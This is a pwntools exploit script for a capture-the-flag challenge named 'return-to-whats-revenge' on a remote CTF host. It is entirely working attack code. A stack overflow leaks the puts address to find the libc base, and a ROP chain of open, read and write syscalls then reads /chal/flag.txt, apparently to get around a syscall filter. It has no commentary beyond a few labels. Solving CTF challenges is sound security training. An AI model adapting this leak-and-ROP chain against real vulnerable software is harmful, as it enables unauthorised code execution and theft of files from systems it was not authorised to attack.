from pwn import *

elf = ELF('./return-to-whats-revenge')
# libc6_2.27-3ubuntu1_amd64
libc = ELF('./libc.so.6')
host = 'chal.duc.tf'
port = 30006

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()
POP_RDI = 0x00000000004019db
bss_addr = 0x404050

p.recvuntil('Where would you like to return to?\n')
payload = 'A' * 56 + p64(POP_RDI) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['main'])
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('PUTS address: {}'.format(hex(leak)))

libc_base = leak - 0x0809c0
gets = libc_base + libc.sym['gets']
POP_RSI = libc_base + 0x0000000000023e6a
POP_RDX = libc_base + 0x0000000000001b96
POP_RAX = libc_base + 0x00000000000439c8
syscall_ret = libc_base + 0x00000000000d2975


payload = flat([
	'A' * 56,
	p64(POP_RDI), p64(bss_addr), p64(gets),
	# open
	p64(POP_RDI), p64(bss_addr), p64(POP_RSI), p64(0x0), p64(POP_RAX), p64(0x2), p64(syscall_ret),
	# read
	p64(POP_RDI), p64(0x3), p64(POP_RSI), p64(bss_addr + 0x20), p64(POP_RDX), p64(0x30), p64(POP_RAX), p64(0x0), p64(syscall_ret),
	# write
	p64(POP_RDI), p64(0x1), p64(POP_RSI), p64(bss_addr + 0x20), p64(POP_RDX), p64(0x30), p64(POP_RAX), p64(0x1), p64(syscall_ret)
])

p.recvuntil('Where would you like to return to?\n')
p.sendline(payload)
p.sendline('/chal/flag.txt')
p.interactive()
p.close()